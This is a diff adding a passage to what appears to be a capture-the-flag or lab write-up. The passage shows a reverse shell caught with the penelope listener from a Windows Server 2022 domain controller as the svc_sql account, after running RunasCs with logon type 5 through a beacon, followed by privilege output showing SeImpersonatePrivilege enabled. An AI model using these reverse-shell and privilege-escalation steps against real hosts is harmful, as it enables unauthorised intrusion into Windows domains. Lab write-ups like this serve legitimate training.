@@ -734,3 +734,30 @@ So ill set another listener
 
 Ill then use my beacon to execute runascs shell using the logon type 5
 
+```python
+penelope -p 1338
+[+] Listening for reverse shells on 0.0.0.0:1338 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => DC02 10.129.48.21 Microsoft_Windows_Server_2022_Datacenter-x64-based_PC 👤 darkzero-ext\svc_sql 😍️ Session ID <1>
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC02~10.129.48.21-Microsoft_Windows_Server_2022_Datacenter-x64-based_PC/2026_08_20-21_35_38-943.log
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+PS C:\Windows\system32> whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+PS C:\Windows\system32>
+```
+
+I now have SeImpersonatePrivilege
+
